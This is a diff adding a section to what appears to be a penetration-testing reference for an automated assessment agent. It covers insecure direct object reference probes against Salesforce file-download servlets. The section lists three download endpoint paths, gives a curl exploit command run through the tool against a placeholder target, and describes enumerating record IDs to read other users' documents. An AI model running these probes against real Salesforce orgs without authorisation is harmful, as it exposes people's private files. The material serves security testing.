@@ -80,6 +80,23 @@ Take one leaked `recordId` (e.g., the `User` Id from a `LastModifiedById` walk).
 
 Record the boundedness verdict in the finding's `details.bounded_or_systemic` field — the verifier and report-writer cannot reconstruct it later.
 
+## File / blob download servlets (ContentVersion IDOR)
+
+A write that returns a `068...` `ContentVersion` id should be followed by a *download* attempt — ownership is frequently unchecked on the download route even when the Aura/REST surface exposes no read. Probe these blob-download endpoints (ties to the object-store IDOR tactic in `agent/references/access-control/idor-modern-architectures.md`):
+
+- `/sfc/servlet.shepherd/version/download/<ContentVersionId>` — download a `ContentVersion` (`068...`) directly.
+- `/servlet/servlet.FileDownload?file=<id>` — legacy `Attachment`/`Document` download by id.
+- `/sfc/servlet.shepherd/document/download/<id>` — download a `ContentDocument` (`069...`).
+
+```bash
+vigil assess kali exec --technique IDOR \
+  --intent "Salesforce ContentVersion blob-download IDOR — read foreign uploaded document" \
+  --probe-kind exploit --phase exploit --timeout 30 -- \
+  curl -sS 'https://TARGET/sfc/servlet.shepherd/version/download/068XXXXXXXXXXXXXXX'
+```
+
+Flip the trailing characters of an observed `068...`/`069...` id to test for systemic enumeration; a 200 with foreign document bytes = cross-user PII read.
+
 ## `executeAction` (worker action) probe
 
 Beyond `getRecordWithFields` and `getObjectInfos`, Aura also exposes server-side controllers via `aura://...Controller/ACTION$<methodName>`. Anonymous-callable controller methods sometimes ship with managed packages or custom code — probe these names against any controller name leaked in the page bootstrap or source maps:
